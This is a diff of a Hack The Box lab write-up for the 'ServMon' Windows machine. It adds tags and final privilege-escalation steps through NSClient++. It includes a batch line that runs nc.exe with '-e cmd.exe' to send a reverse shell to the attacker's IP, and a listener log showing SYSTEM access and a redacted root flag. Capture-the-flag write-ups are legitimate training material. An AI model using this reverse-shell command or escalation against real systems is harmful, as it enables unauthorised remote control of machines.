@@ -3,12 +3,14 @@ title: HTB - ServMon Write-up
 author: bigb0ss
 date: 2020-11-23 23:25:00 +0800
 categories: [Hack The Box, Windows, Easy]
-tags: [hackthebox, servmon, ]
+tags: [hackthebox, servmon, anonaymous FTP, NVMS-1000 directory traversal, NSClient++]
 image: /assets/img/post/htb/servmon/01_infocard.png
 ---
 
 This one was an easy-difficulty Windows box. Good learning path for:
-* 
+* Anonymous FTP Access and Enumeration
+* NVMS-1000 Directory Traversal Attack
+* NSClient++ Privilege Escalation
 
 
 # Initial Recon
@@ -366,7 +368,7 @@ This worked and we can successfully login now.
 ![image](/assets/img/post/htb/servmon/07.png)
 
 
-3. Download `nc.exe` and `bigb0ss.bat` to c:\temp from attacking machine:
+3. Download `nc.exe` (*Use 64.bit one) and `bigb0ss.bat` to c:\temp from attacking machine:
 	
 ```bat
 @echo off
@@ -385,35 +387,34 @@ c:\temp\nc.exe -e cmd.exe 10.10.14.22 443
 ![image](/assets/img/post/htb/servmon/09.png)
 
 
-5. Open up `nc` listener on our Kali and go to Queires and run `bigb0ss`
+5. Open up `nc` listener on port `443` on our Kali and go to Queires and run `bigb0ss`
 
+![image](/assets/img/post/htb/servmon/10.png)
 
+![image](/assets/img/post/htb/servmon/11.png)
 
+<b>root.txt</b>
 
+Then, we can get a `NT SYSTEM` shell and read the `root.txt` flag.
 
+```console
+root@kali:~/Documents/htb/box/servmon# nc -lvnp 443
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.184.
+Ncat: Connection from 10.10.10.184:50197.
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
 
+C:\Program Files\NSClient++>whoami
+whoami
+nt authority\system
 
-6. Add schedulede to call script every 1 minute and save settings
-- Settings > Scheduler > Schedules
-- Add new
-	- foobar
-		interval = 1m
-		command = foobar
-
-7. Restart the computer and wait for the reverse shell on attacking machine
-	nc -nlvvp 443
-	listening on [any] 443 ...
-	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
-	Microsoft Windows [Version 10.0.17134.753]
-	(c) 2018 Microsoft Corporation. All rights reserved.
-
-	C:\Program Files\NSClient++>whoami
-	whoami
-	nt authority\system
-
-
-
-
+C:\Program Files\NSClient++>type c:\Users\Administrator\Desktop\root.txt
+type c:\Users\Administrator\Desktop\root.txt
+6353 ***REDACTED*** 0e42
+```
 
 Thanks for reading!
 
